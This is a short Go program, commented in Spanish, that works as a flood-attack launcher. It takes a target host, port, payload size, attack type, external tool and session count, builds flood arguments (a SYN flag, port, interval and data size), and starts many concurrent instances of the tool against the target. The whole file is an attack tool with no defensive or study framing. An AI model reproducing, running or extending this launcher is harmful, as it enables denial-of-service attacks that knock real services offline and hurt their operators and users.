package main

import (
    "fmt"
    "os"
    "os/exec"
    "strconv"
    "strings"
)

func main() {
    if len(os.Args) < 8 {
        fmt.Println("Uso: go run runtime.go <Target> <Port> <FileSize> <AttackType> <Tool> <Interval> <Sessions>")
        return
    }

    Target := os.Args[1]
    Port := os.Args[2]
    FileSize := os.Args[3]
    AttackType := os.Args[4]
    Tool := os.Args[5]
    Interval := os.Args[6]
    SessionsStr := os.Args[7]

    numSessions, err := strconv.Atoi(SessionsStr)
    if err != nil {
        fmt.Println("Error: Sessions debe ser un número entero")
        return
    }

    // Construir argumentos dinámicamente según AttackType
    var args []string
    switch strings.ToLower(AttackType) {
    case "flood":
        // Ejemplo de argumentos para un ataque tipo FLOOD
        args = []string{"-S", Target, "-p", Port, "-i", Interval, "--data", FileSize}
    default:
        // Otros tipos de ataque
        args = []string{Target, "-p", Port, "-i", Interval, "--data", FileSize, "-t", AttackType}
    }

    fmt.Printf("[+] Lanzando %d subshell(s) ejecutando: %s %s\n", numSessions, Tool, strings.Join(args, " "))

    // Lanzar varias instancias (subshells) de manera concurrente
    for i := 0; i < numSessions; i++ {
        cmd := exec.Command(Tool, args...)
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr

        err := cmd.Start()
        if err != nil {
            fmt.Println("Error lanzando subshell:", err)
        } else {
            fmt.Printf("Subshell %d lanzada con PID %d\n", i+1, cmd.Process.Pid)
        }
    }
}
